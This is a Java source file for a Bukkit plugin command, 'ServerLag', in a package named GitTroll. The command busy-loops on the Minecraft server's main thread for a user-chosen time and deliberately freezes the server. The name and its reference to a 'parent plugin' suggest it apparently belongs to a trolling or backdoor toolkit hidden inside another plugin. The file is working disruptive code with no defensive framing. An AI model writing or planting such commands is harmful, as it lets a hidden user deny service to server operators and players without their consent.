package net.Lenni0451.GitTroll.command.commands.server;

import java.util.List;

import org.bukkit.Bukkit;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class ServerLag extends CommandBase {

	public ServerLag() {
		super("ServerLag", "Let the server lag for a specific time", "<Time in ms>");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLength(1) && args.isLong(0)) {
			long time = args.getLong(0);
			
			executor.sendGitMessage("The server should lag now.");
			Bukkit.getScheduler().runTask(GitTroll.getInstance().getParentPlugin(), () -> {
				long start = System.currentTimeMillis();
				while(System.currentTimeMillis() - start < time) {
					Integer.valueOf(0);
				}
			});
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}

}
